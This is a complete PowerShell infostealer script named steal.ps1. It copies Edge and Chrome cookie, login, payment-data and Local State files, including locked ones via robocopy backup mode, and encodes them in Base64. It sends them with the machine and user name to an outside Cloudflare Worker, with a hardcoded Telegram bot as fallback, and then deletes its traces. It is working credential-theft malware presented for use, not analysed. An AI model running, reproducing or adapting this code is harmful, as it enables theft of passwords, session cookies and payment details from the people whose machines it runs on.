# steal.ps1
# Exfiltrates Edge/Chrome Cookies.db, Local State, Login Data, and Web Data.
# Sends all files as Base64 to your Cloudflare Worker.

$worker_url = "https://reciever.tyceno89.workers.dev"
$temp = "$env:TEMP\steal_all"
New-Item -ItemType Directory -Force -Path $temp | Out-Null

# --- 1) Browser paths ---
$browsers = @(
    @{
        Name = "Edge"
        LocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
        Cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
        LoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        WebData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
    },
    @{
        Name = "Chrome"
        LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
        Cookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        LoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        WebData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
    }
)

# --- 2) Helper to copy locked files (robocopy /B) ---
function Copy-LockedFile {
    param($src, $dst)
    # Try normal copy first
    try { Copy-Item $src $dst -Force -ErrorAction Stop; return $true } catch {}
    # Try robocopy with backup mode
    try {
        $src_dir = Split-Path $src
        $src_file = Split-Path $src -Leaf
        $dst_dir = Split-Path $dst
        robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
        return (Test-Path $dst)
    } catch {}
    return $false
}

# --- 3) Collect files ---
$files_to_send = @()

foreach ($b in $browsers) {
    # Local State
    if (Test-Path $b.LocalState) {
        $dst = "$temp\$($b.Name)_LocalState.json"
        if (Copy-LockedFile $b.LocalState $dst) {
            $files_to_send += @{ name = "$($b.Name)_LocalState.json"; path = $dst }
        }
    }
    # Cookies
    if (Test-Path $b.Cookies) {
        $dst = "$temp\$($b.Name)_Cookies.db"
        if (Copy-LockedFile $b.Cookies $dst) {
            $files_to_send += @{ name = "$($b.Name)_Cookies.db"; path = $dst }
        }
    }
    # Login Data (passwords)
    if (Test-Path $b.LoginData) {
        $dst = "$temp\$($b.Name)_LoginData.db"
        if (Copy-LockedFile $b.LoginData $dst) {
            $files_to_send += @{ name = "$($b.Name)_LoginData.db"; path = $dst }
        }
    }
    # Web Data (payment methods)
    if (Test-Path $b.WebData) {
        $dst = "$temp\$($b.Name)_WebData.db"
        if (Copy-LockedFile $b.WebData $dst) {
            $files_to_send += @{ name = "$($b.Name)_WebData.db"; path = $dst }
        }
    }
}

# --- 4) Build payload with all files ---
$payload = @{
    pc = $env:COMPUTERNAME
    user = $env:USERNAME
    files = @{}
}

foreach ($f in $files_to_send) {
    $bytes = [IO.File]::ReadAllBytes($f.path)
    $b64 = [Convert]::ToBase64String($bytes)
    $payload.files[$f.name] = $b64
    Remove-Item $f.path -Force -ErrorAction SilentlyContinue
}

# --- 5) Send to worker ---
$json = $payload | ConvertTo-Json -Depth 10
try {
    Invoke-RestMethod -Uri $worker_url -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop
} catch {
    # Fallback: send to Telegram
    $t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
    $c = "6760965981"
    $msg = "Files from $($env:COMPUTERNAME): $($files_to_send.Count) files"
    $body = @{ chat_id = $c; text = $msg }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
}

# --- 6) Cleanup ---
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
